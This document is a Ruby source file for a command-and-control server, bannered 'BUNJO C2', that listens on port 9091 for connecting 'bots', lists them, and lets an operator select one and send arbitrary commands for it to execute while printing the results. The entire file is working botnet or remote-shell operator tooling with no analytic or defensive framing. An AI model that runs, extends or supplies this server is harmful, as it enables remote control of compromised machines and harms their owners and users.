class C2Server
  def initialize
    require 'socket'
    require 'readline'
    require 'timeout'

    @clients = {}

    @LHOST = '0.0.0.0'
    @LPORT = 9091

    begin
      @server_socket = TCPServer.new(@LHOST, @LPORT)
    rescue Exception => server_socket_error
      $stderr.puts("Error: #{server_socket_error}")
      exit(1)
    end
  end

  def close_program
    $stdout.puts("Program closed!")
    exit()
  end

  def print_help
    help_text = <<-'HELP_TEXT'
help: print help message.
show: show all bots.
select bot: select a bot via index.
exit: close program.
close bot: close a bot.
back: return main.
    HELP_TEXT

    $stdout.puts(help_text)
  end

  def close_bot
    show_bots()
    selection = Readline.readline("Close Bot (index): ").to_i - 1

    if selection >= 0 && selection < @clients.length
      selected_bot_ip = @clients.keys[selection]
      selected_bot_socket = @clients[selected_bot_ip]

      $stdout.puts("Closing Bot: #{selected_bot_ip}")
      selected_bot_socket.close
      @clients.delete(selected_bot_ip)
    else
      $stdout.puts("Invalid selection.")
    end
  end

  def user_interactive
    loop do
      @command = Readline.readline("Command: ").to_s

      case @command.downcase

      when "help"
        print_help()
      when "show"
        show_bots()
      when "select bot"
        select_bot()
      when "close bot"
        close_bot()
      when "exit"
        close_program()
      else
        $stdout.puts("Command not found.")
      end
    end
  end

  def listen
    $stdout.puts("Listening connections on #{@LHOST}:#{@LPORT}")

    loop do
      begin
        @client = @server_socket.accept()
        Thread.new {handle_client(@client)}
        Thread.new {user_interactive}
      rescue Interrupt
        close_program()
      rescue Exception => accept_error
        $stderr.puts("Error: #{accept_error}")
      end
    end
  end

  def handle_client(client)
    ip_address = client.peeraddr[3]

    unless @clients.key?(ip_address)
      @clients[ip_address] = client
      $stdout.puts("New Bot: #{ip_address}")
    end
  end

  def show_bots
    if @clients.empty?
      $stdout.puts("No bots connected.")
    else
      $stdout.puts("Connected Bots:")
      @clients.each_with_index do |(ip, _), index|
        $stdout.puts("#{index + 1}. #{ip}")
      end
    end
  end

  def select_bot
    show_bots()
    selection = Readline.readline("Select Bot (index): ").to_i - 1

    if selection >= 0 && selection < @clients.length
      selected_bot_ip = @clients.keys[selection]
      selected_bot_socket = @clients[selected_bot_ip]

      $stdout.puts("Selected Bot: #{selected_bot_ip}")

      loop do
        code_to_exec = Readline.readline("Execute: ").to_s

        if code_to_exec == "back"
          break
        else
          send_message(selected_bot_socket, code_to_exec)
        end
      end
    else
      $stdout.puts("Invalid selection.")
    end
  end

  def send_message(socket, message)
    begin
      response = socket.puts(message)
      Timeout.timeout(0.1) do
        while (line = socket.gets)
          $stdout.print(line)
          break if line.chomp.empty?
        end
      end
    rescue Timeout::Error

    rescue => send_error
      $stderr.puts("Error sending message: #{send_error}")
    end
  end
end

def banner
  banner_text = <<-'BANNER_TEXT'
        +-
                 *       +
           '                  |      
       ()    .-.,="``"=.    - o -     
             '=/_ BUNJO  \     |    
          *   |  '=._    |                 
               \  C2 `=./`,        '
            .   '=.__.=' `='      *
   +                         +
        O      *        '       .

  BANNER_TEXT

  $stdout.puts(banner_text)
end

banner()
c2_main = C2Server.new()
c2_main.listen()